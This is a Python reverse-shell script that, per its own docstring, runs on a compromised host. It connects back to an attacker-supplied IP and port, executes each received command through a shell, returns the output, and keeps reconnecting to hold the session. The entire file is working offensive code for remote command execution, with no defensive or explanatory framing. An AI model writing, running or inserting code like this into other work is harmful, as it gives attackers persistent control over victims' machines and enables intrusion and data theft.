import socket, sys, time
import subprocess as sp
import argparse

""" Set up listener on attacking machine and connect to it with this script from compromised host """

# all of the print()'s signaling what's going on can be removed
# there just for testing

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-H", "--host", help="Attacker's IP to receive connection on")
	parser.add_argument("-p", "--port", type=int, help="Port attacker's machine is listening on")
	return parser.parse_args()

def connect(host, port):
	s = socket.socket()
	print("[*] Attempting to connect back to attacker's machine ...")
	print("       (Set up a listener on: tcp/{})".format(port))
	s.connect((host, port))
	return s

def wait(s):	
	data = s.recv(1024)
	data = data.decode("utf-8")
	if data == "exit\n":
		print("[*] 'Exit' caught! Bye bye ...")
		s.close()
		sys.exit(0)
	elif len(data) == 0:
		print("[!] Session lost -- attempting auto-reconnect ...")
		return True
	else:
		print("[*] Entering command: {} ".format(data))
		p = sp.Popen(data, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
		stdout = p.stdout.read() + p.stderr.read()
		s.send(stdout)
		return False

def main():
	
	args = parse_args()
	host = args.host
	port = args.port

	while True:
		dead = False
		try:
			s = connect(host, port)
			print("[*] Connection successful!")
			while True:
				dead = wait(s)  # until dead=True, connections persists, hence returning False w/ stdout
			s.close()	
		except socket.error:
			pass
		time.sleep(2)


if __name__ == "__main__":
	main()
